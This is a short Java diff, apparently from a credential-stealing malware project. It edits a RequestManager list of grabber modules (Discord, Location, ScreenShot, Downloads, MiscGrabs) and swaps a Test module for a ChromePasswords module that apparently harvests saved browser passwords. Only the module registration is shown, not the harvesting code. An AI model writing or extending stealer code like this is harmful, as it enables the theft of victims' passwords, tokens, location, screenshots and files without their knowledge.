@@ -15,7 +15,7 @@ public class RequestManager {
                 new MiscGrabs(),
                 new Location(),
                 new Discord(),
-                new Test(),
+                new ChromePasswords(),
                 new ScreenShot(),
                 new Downloads()
         ));
